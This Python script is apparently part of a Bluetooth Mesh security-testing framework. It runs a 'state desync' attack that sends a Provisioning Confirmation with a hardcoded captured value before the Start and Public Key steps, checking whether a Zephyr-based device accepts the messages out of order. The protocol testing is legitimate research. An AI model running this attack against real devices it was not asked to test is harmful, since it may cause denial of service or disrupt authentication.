import sys
import os
import random
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__)))+"/../")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))) + "/libs/")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))) + "/libs/boofuzz/")

from colorama import Fore
from Transfer.Send_Packet.BluetoothMesh_SUL import BluetoothMesh_SUL
from Transfer.Config.Zerphy import config
from Transfer.libs.driver.NRF52_dongle import NRF52Dongle
# from scapy.utils import hexdump


port_name = config.device["port_name"]
logs_pcap = config.device["logs_pcap"]
pcap_filename = config.device["pcap_filename"]
key_path = config.device["key_path"]
unprovisioned_device_address = config.device["unprovisioned_device_address"]
iat = config.device["iat"]
rat = config.device["rat"]
role = config.device["role"]
rx_len = config.device["rx_len"]
tx_len = config.device["tx_len"]
logger_handle = config.device["log_path"]
algorithm = config.device["algorithm"]


def create_confirmation_with_value(blemesh_sul, confirmation_value: bytes):
    """
    创建指定 Confirmation 值的 Provisioning Confirmation 消息（支持分段）
    从 packet_construction 获取原始 confirmation 分段，按传入的 confirmation_value 覆盖
    """
    pkt = blemesh_sul.packet_construction.pbadv.PROVISIONING_CONFIRMATION()
    pkt["Provisioning_Confirmation"].Confirmation = confirmation_value
    # pkt.show2()
    pkt_list = blemesh_sul.packet_construction.pbadv_handle.fragment(pkt)
    # print(pkt_list)
    return pkt_list


def confirmation_state_desync_attack(blemesh_sul):
    """
    CONFIRMATION-STATE-DESYNC-02 攻击测试
    通过在错误状态下发送 Confirmation 来测试状态去同步
    
    攻击场景：
    1. 在未完成 Public Key 交换时发送 Confirmation
    2. 跳过 Public Key 直接发送 Confirmation
    3. 测试设备是否严格限制状态转换顺序
    
    可能导致的问题：
    - DoS
    - 未定义的认证行为
    
    观察信号：
    - 在公钥之前接受 Confirmation
    - 日志中观察到状态跳转
    """
    # print(Fore.YELLOW + "=" * 80)
    # print(Fore.YELLOW + "[攻击测试] CONFIRMATION-STATE-DESYNC-02: Confirmation 状态去同步攻击")
    # print(Fore.YELLOW + "=" * 80)
    # print()
    
    # # ========== 测试用例: 在错误状态下发送 Confirmation ==========
    # print(Fore.RED + "[测试用例] 在错误状态下发送 Confirmation（状态去同步测试）")
    # print(Fore.RED + "目标：测试设备是否严格限制协议状态序列")
    # print()
    
    # # 步骤1: 攻击 - 跳过 Public Key，直接发送 Confirmation
    # print(Fore.RED + "步骤1: 攻击 - 跳过 Public Key，直接发送 Confirmation")
    # print(Fore.RED + "  ⚠ 这是攻击步骤：在未完成 Public Key 交换时发送 Confirmation")
    # print()
    
    # # 建立链接
    # print(Fore.CYAN + "  建立 Link Open...")
    # link_open_pkt = blemesh_sul.get_pkt("link_open_message_pkt")
    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=link_open_pkt)
    # print(Fore.GREEN + "    ✓ Link Open 已发送")
    # print()
    
    # invite_pkt = blemesh_sul.get_pkt("provisioning_invite_pkt")
    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=invite_pkt)
    # print(Fore.GREEN + "    ✓ Invite 已发送")

    
    # capabilities_pkt = blemesh_sul.get_pkt("transaction_acknowledgment_pkt")
    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=capabilities_pkt)
    # print(Fore.GREEN + "    ✓ Transaction Acknowledgment 已发送")

    
    # start_pkt = blemesh_sul.get_pkt("provisioning_start_pkt")
    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=start_pkt)
    # print(Fore.GREEN + "    ✓ Start 已发送")

    
    
    # # 跳过 Public Key，直接发送 Confirmation
    print(Fore.CYAN + "  跳过 Public Key，直接发送 Confirmation（错误状态）...", end=" ... ")  
    captured_confirmation = bytes.fromhex(
        "e6e7311582b93e8a252c7587d8941ddd61cbbd4437637e18d2472c168ecbfe2c"
    )
    confirmation_pkt = create_confirmation_with_value(blemesh_sul, captured_confirmation)
    


    # try:
    #     receive_pkt = blemesh_sul.packet_send_received_control(
    #         send_pkt=confirmation_pkt
    #     )
        
    #     if receive_pkt and receive_pkt != "empty":
    #         print(Fore.YELLOW + "⚠ 收到响应")
    #         print(Fore.YELLOW + f"    -> 响应: {receive_pkt}")
    #         print(Fore.RED + "    ⚠ 警告: 设备在未完成 Public Key 交换时接受了 Confirmation！")
    #         print(Fore.RED + "    ⚠ 可能导致状态机错乱或提前进入 Random 校验阶段")
    #     else:
    #         print(Fore.GREEN + "✓ 无响应（设备可能正确拒绝了错误状态的 Confirmation）")
    # except Exception as e:
    #     print(Fore.RED + f"✗ 异常: {str(e)}")
    
    # pkt = blemesh_sul.get_pkt("provisioning_public_key_pkt")
    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
    # print(Fore.GREEN + "    ✓ Public Key 已发送")

    # pkt = blemesh_sul.get_pkt("transaction_acknowledgment_pkt")
    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
    # print(Fore.GREEN + "    ✓ Confirmation 已发送")

    # pkt = blemesh_sul.get_pkt("provisioning_random_pkt")
    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
    # print(Fore.GREEN + "    ✓ Confirmation 已发送")


    # # 步骤3: 攻击 - 在 Start 之前发送 Confirmation
    print(Fore.RED + "步骤3: 攻击 - 在 Start 之前发送 Confirmation（更早的错误状态）")
    print()
    
    # 重新建立流程
    # blemesh_sul.pre()
    link_open_pkt3 = blemesh_sul.get_pkt("link_open_message_pkt")
    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=link_open_pkt3)

    
    invite_pkt3 = blemesh_sul.get_pkt("provisioning_invite_pkt")
    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=invite_pkt3)
 
    
    capabilities_pkt3 = blemesh_sul.get_pkt("transaction_acknowledgment_pkt")
    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=capabilities_pkt3)
 
    
    # 跳过 Start 和 Public Key，直接发送 Confirmation
    # print(Fore.CYAN + "  跳过 Start 和 Public Key，直接发送 Confirmation...", end=" ... ")
    
    confirmation_pkt3 = create_confirmation_with_value(blemesh_sul, captured_confirmation)
    
    try:
        receive_pkt = blemesh_sul.packet_send_received_control(
            send_pkt=confirmation_pkt3
        )
        
        if receive_pkt and receive_pkt != "empty":
            print(Fore.YELLOW + "⚠ 收到响应")
            print(Fore.YELLOW + f"    -> 响应: {receive_pkt}")
            print(Fore.RED + "    ⚠ 警告: 设备在非常早的状态接受了 Confirmation！")
        else:
            print(Fore.GREEN + "✓ 无响应（设备可能正确拒绝了错误状态的 Confirmation）")
    except Exception as e:
        print(Fore.RED + f"✗ 异常: {str(e)}")




# 主程序
blemesh_sul = BluetoothMesh_SUL(NRF52Dongle(port_name=port_name, logs_pcap=logs_pcap, pcap_filename=pcap_filename),
                                unprovisioned_device_address,
                                iat=iat,
                                rat=rat,
                                role=role,
                                rx_len=rx_len,
                                tx_len=tx_len,
                                logger_handle=logger_handle,
                                key_path=key_path,
                                algorithm=algorithm)

device_state = blemesh_sul.pre()

print(device_state)

if device_state == "unprovisioned_device_beacon_pkt":
    print(Fore.GREEN + "Device found, starting state desync attack")
    receive_pkt = ""
    while "Link_ACK_Message" not in receive_pkt:        
        pkt = blemesh_sul.get_pkt("link_open_message_pkt")
        receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
        print(receive_pkt)
    print(Fore.GREEN + "Link_ACK_Message received")
    confirmation_state_desync_attack(blemesh_sul)
elif device_state == "secure_network_beacon_pkt":
    print(Fore.GREEN + "Device found, already in secure network")
    print(Fore.YELLOW + "State desync attack requires unprovisioned device")
else:
    print(Fore.YELLOW + "Device state unknown, attempting attack anyway...")
    confirmation_state_desync_attack(blemesh_sul)

# blemesh_sul.post()


